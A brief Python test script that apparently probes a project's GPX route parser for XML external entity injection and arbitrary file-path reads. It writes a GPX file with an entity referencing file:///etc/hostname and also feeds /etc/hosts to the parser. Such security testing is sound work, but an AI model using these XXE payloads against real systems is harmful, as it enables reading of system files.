import sys

sys.path.insert(0, "backend")
from app.ingest.gpx import parse_gpx_route
from pathlib import Path

# 1) arbitrary path read via DB-supplied path
p = Path("/tmp/tti_xxe_test.gpx")
p.write_text("""<?xml version="1.0"?>
<!DOCTYPE gpx [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<gpx xmlns="http://www.topografix.com/GPX/1/1">
 <trk><trkseg>
  <trkpt lat="1.0" lon="2.0"><name>&xxe;</name></trkpt>
 </trkseg></trk>
</gpx>
""")
print("entity-expansion parse result:", parse_gpx_route(str(p)))
print("arbitrary path (non-gpx file):", parse_gpx_route("/etc/hosts"))
